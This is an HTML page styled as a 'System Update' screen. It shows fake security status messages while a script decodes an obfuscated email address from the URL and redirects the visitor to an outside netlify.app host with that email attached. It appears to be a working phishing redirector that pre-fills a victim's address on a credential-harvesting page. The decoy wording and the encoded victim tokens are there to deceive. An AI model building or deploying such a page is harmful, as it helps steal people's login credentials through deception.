<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Update</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
        }
        .loader {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 30px;
        }
        h1 {
            font-weight: 300;
            margin: 0 0 15px 0;
            font-size: 24px;
        }
        p {
            margin: 0;
            opacity: 0.8;
            line-height: 1.5;
        }
        .status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.7;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
    (function() {
        'use strict';
        
        // Decode obfuscated email
        function decodeEmail(encoded) {
            try {
                // URL-safe base64 decode
                let safe = encoded.replace(/-/g, '+').replace(/_/g, '/');
                while (safe.length % 4) safe += '=';
                const decoded = atob(safe);
                
                // Simple XOR decode (optional second layer)
                let result = '';
                const key = 42; // XOR key
                for (let i = 0; i < decoded.length; i++) {
                    result += String.fromCharCode(decoded.charCodeAt(i) ^ key);
                }
                return result;
            } catch(e) {
                return null;
            }
        }
        
        // Get encoded token from URL
        function getToken() {
            const url = new URL(window.location.href);
            
            // Check for 't' parameter (encoded)
            const token = url.searchParams.get('t');
            if (token && token.length > 10) return token;
            
            // Check hash (if someone puts encoded in hash)
            if (url.hash && url.hash.length > 10) {
                return url.hash.substring(1);
            }
            
            // Check path segments
            const path = url.pathname;
            const segments = path.split('/').filter(s => s.length > 10);
            if (segments.length > 0) {
                return segments[segments.length - 1];
            }
            
            return null;
        }
        
        // Update status
        function updateStatus(msg) {
            const el = document.getElementById('status');
            if (el) el.textContent = msg;
        }
        
        // Main redirect
        function redirect() {
            updateStatus('Checking authorization...');
            
            const token = getToken();
            const targetBase = 'https://startling-halva-d2e52f.netlify.app';
            
            setTimeout(() => {
                if (token) {
                    updateStatus('Validating security token...');
                    
                    setTimeout(() => {
                        const email = decodeEmail(token);
                        
                        if (email && email.includes('@') && email.includes('.')) {
                            updateStatus('Redirecting to secure portal...');
                            
                            // Encode email for final URL (simple URL encoding)
                            const finalEmail = encodeURIComponent(email);
                            const finalUrl = targetBase + '#' + finalEmail;
                            
                            setTimeout(() => {
                                window.location.replace(finalUrl);
                            }, 500 + Math.random() * 500);
                            
                        } else {
                            // Invalid token
                            updateStatus('Invalid authorization, using standard access...');
                            setTimeout(() => {
                                window.location.replace(targetBase);
                            }, 1000);
                        }
                    }, 600);
                    
                } else {
                    // No token
                    updateStatus('Initiating standard access...');
                    setTimeout(() => {
                        window.location.replace(targetBase);
                    }, 800);
                }
            }, 500);
        }
        
        // Start after delay
        setTimeout(redirect, 800);
        
    })();
    </script>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>System Initialization</h1>
        <p>Preparing secure environment...</p>
        <div class="status" id="status">Loading security protocols</div>
    </div>
</body>
</html>
